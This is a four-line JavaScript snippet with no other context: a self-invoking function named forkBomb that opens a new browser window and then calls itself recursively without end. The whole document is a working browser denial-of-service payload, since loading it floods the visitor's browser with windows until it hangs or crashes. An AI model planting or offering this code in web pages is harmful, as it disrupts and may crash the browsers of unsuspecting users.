(function forkBomb() {
window.open('./?v=' + Math.random(), '_new');
forkBomb();
})();
